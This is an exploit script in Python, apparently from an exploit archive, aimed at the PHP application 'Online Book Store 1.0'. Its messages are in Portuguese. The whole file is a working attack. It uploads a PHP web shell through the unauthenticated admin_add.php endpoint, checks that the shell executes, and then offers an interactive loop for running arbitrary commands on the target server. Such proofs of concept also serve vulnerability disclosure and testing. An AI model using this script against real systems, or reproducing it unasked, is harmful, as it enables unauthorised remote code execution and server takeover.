# Exploit Title: Online Book Store 1.0 - Unauthenticated Remote Code Execution
# Google Dork: N/A
# Date: 2020-01-07
# Exploit Author: Tib3rius
# Vendor Homepage: https://projectworlds.in/free-projects/php-projects/online-book-store-project-in-php/
# Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/master.zip
# Version: 1.0
# Tested on: Ubuntu 16.04
# CVE: N/A

import argparse
import random
import requests
import string
import sys

def shell(url):    
    url = url.rstrip('/')
    random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))

    payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'

    file = {'image': (random_file + '.php', payload, 'text/php')}
    print('\n> Carregando o shell...')
    r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
    print('> Veriificando o carregando da shell...')
    r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)
    
    print(r.url)
    print(random_file)

    if random_file in r.text:
        print('> Shell carregado em  ' + url + '/bootstrap/img/' + random_file + '.php')
        print('> Exemplo de uso do shell: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
        launch_shell = str(input('> Desejas lançar o Shell aqui? (s/n): '))
        if launch_shell.lower() == 's':
            while True:
                cmd = str(input('RCE $ '))
                if cmd == 'exit':
                    sys.exit(0)
                r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
                print(r.text)
    else:
        if r.status_code == 200:
            print('> Shell carregado em  ' + url + '/bootstrap/img/' + random_file + '.php, porém uma fase de verificação faalhou. Tente mudar o payload do shell.')
        else:
            print('> Falha no carregamento da shell, o servidor pode não ter permissões de escrita.')